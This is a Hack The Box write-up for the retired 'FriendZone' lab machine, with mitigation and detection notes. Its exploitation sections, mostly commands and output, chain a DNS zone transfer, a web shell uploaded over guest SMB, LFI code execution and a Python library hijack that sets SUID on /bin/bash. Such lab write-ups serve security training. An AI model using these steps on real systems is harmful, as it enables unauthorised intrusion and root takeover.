---
machine: FriendZone
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, dns, smb, lfi, cron, python-hijack]
---

# FriendZone — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

DNS with an open zone transfer, guest SMB and a writable share. The zone reveals three subdomains; `general` hands over panel credentials, the panel has an LFI in `pagename`, and `Development` maps to `/etc/Development`, so a web shell uploaded over SMB gets included. Inside, `mysql_data.conf` gives `friend`'s password, and a root cron running a Python script whose `os.py` is world-writable finishes the escalation.

## Recon

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
21/tcp   ftp    vsftpd 3.0.3 (anonymous denied)
22/tcp   ssh    OpenSSH 7.6p1 Ubuntu 18.04
53/tcp   domain ISC BIND 9.11.3 (TCP open)
80/tcp   http   Apache 2.4.29
139/445  smb    Samba 4.7.6 (guest)
443/tcp  https  Apache (cert CN=friendzone.red)
```

```bash
echo "<IP> friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red" | sudo tee -a /etc/hosts
```

## Enumeration

```bash
dig axfr friendzone.red @<IP>
```

```text
administrator1.friendzone.red  A  127.0.0.1
hr.friendzone.red              A  127.0.0.1
uploads.friendzone.red         A  127.0.0.1
```

SMB:

```bash
smbmap -H <IP>
smbclient //<IP>/general -N
```

```text
general      READ
Development  READ,WRITE
```

`general` holds `creds.txt`:

```text
creds for the admin THING:
admin:<password>
```

The `Files` share comment ("/etc/Files") betrays that shares live under `/etc`; by analogy, `Development` is `/etc/Development`.

## Foothold

`https://administrator1.friendzone.red` has a login; with `admin:<password>` it redirects to `dashboard.php`, which loads a page from `pagename` and appends `.php` automatically.

```bash
smbclient //<IP>/Development -N
smb: \> put shell.php
```

```text
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell&cmd=id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Pass the path without `.php` because the application adds it. A reverse shell needs the login session cookie, so authenticate with `curl -c` and reuse it with `-b`.

## Escalation

```bash
cat /var/www/mysql_data.conf
# db_user=friend
# db_pass=<password>
```

```bash
su friend
```

`friend` belongs to `adm` and `lpadmin`, but what matters is what it can write:

```bash
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'
# /usr/lib/python2.7/os.py
```

```bash
cat /opt/server_admin/reporter.py
# #!/usr/bin/python
# import os
```

`pspy` confirms root runs `reporter.py` every minute. Since `import os` loads `/usr/lib/python2.7/os.py`, which is writable, append one line:

```bash
echo 'import os; os.system("chmod +s /bin/bash")' >> /usr/lib/python2.7/os.py
```

Append, do not replace: the module must keep working or the cron job fails. A minute later:

```bash
/bin/bash -p
```

## Evidence

- `dig axfr` showing the three subdomains.
- `id` → `www-data`, `friend`, `root`.
- `ls -la /bin/bash` with the SUID bit.

## Lessons learned

- TCP port 53 open invites an AXFR test; a misconfigured zone hands over the whole map.
- Samba share comments leak filesystem paths (`/etc/Files`).
- LFI plus a writable share equals RCE, even when the LFI looks read-only.
- A root cron importing a writable module is escalation without touching the script.
- Confirm with `pspy` before modifying anything, so you do not break the box for nothing.

## Mitigations and detection

- Restrict AXFR to authorised secondaries.
- Remove guest SMB access and stop publishing writable shares.
- Validate `pagename` against an allowlist and never append `.php` to a user path.
- Mode 0755 and root ownership on the Python standard library; audit `find / -writable`.
- Root cron only over scripts and modules others cannot write.
- Detection: AXFR queries from unauthorised hosts, writes under `/usr/lib/python*`, new SUID files.
- MITRE: T1590.002 (DNS), T1083, T1053.003.

## References

- MITRE ATT&CK: T1590.002, T1053.003, T1548.001.
- BIND documentation on `allow-transfer`.
